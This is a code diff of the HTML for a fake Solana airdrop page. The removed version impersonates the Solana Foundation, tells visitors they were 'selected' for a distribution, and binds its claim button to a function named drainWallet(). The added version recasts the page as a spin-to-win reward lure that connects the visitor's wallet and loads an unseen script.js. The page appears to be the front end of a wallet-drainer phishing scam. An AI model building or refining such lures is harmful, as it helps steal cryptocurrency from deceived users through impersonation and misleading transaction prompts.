@@ -3,50 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Rewards | Claim Your Airdrop</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Solana Web3.js Library -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <title>SOL Airdrop</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0d0d0d;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .content-box {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+        }
+        button {
+            background: #3a6ea5;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+        }
+        button:hover {
+            background: #4b89bc;
+        }
+        .hidden {
+            display: none;
+        }
+        #spin-section {
+            text-align: center;
+        }
+        #spin-result {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff84;
+            margin: 10px 0;
+        }
+        #notification-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .notification {
+            background: #2a2a2a;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1 style="text-align: center; margin-top: 20px;">Solana Rewards</h1>
+    <div class="content-box">
+        <h2>SOL Airdrop</h2>
+        <p id="status">Connect your wallet to start spinning!</p>
         
-        <div class="content-box">
-            <h2>Congratulations!</h2>
-            <p id="intro-text">You have been selected for a special Solana distribution.</p>
-            
-            <div id="status" class="status">Waiting for connection...</div>
-            
-            <button id="connectBtn" onclick="startProcess()">Connect Wallet & Claim</button>
-            
-            <div id="claim-details" class="hidden">
-                <div class="detail-row">
-                    <span>Airdrop Amount:</span>
-                    <span id="reward-amount" class="highlight">...</span>
-                </div>
-                <div class="detail-row">
-                    <span>Your Wallet Balance:</span>
-                    <span id="user-balance" class="highlight">...</span>
-                </div>
-                <div class="detail-row">
-                    <span>Network Fee:</span>
-                    <span>0.000005 SOL</span>
-                </div>
-                <p class="small-text">Click "Claim" to approve the transaction. This will verify your account and distribute your rewards.</p>
-            </div>
-            
-            <button id="claimBtn" class="hidden" onclick="drainWallet()">Claim Now</button>
+        <button id="connectBtn">Connect Wallet</button>
+        
+        <div id="spin-section" class="hidden">
+            <h3>Spinning...</h3>
+            <div id="spin-result">0.0000 SOL</div>
         </div>
         
-        <div class="footer">
-            <p>© 2026 Solana Foundation. All rights reserved.</p>
+        <div id="claim-details" class="hidden">
+            <h3>🎉 You won:</h3>
+            <p id="reward-amount">0.0000 SOL</p>
+            <button id="claimBtn">Claim Reward</button>
         </div>
     </div>
-
-    <!-- Notification Container -->
+    
     <div id="notification-container"></div>
-
+    
+    <!-- Include Solana Web3.js -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
     <script src="script.js"></script>
 </body>
 </html>
